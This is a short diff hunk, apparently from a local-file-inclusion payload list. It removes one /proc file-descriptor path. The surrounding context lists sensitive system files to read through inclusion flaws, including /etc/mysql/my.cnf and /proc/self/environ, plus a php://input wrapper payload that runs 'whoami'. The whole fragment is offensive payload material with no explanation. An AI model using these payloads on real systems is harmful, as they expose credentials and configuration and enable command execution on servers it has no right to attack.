@@ -31,7 +31,6 @@ php://input&cmd=whoami
 /etc/hosts
 /etc/motd
 /etc/mysql/my.cnf
-/proc/[0-9]*/fd/[0-9]*   (first number is the PID, second is the filedescriptor)
 /proc/self/environ
 /proc/version
 /proc/cmdline
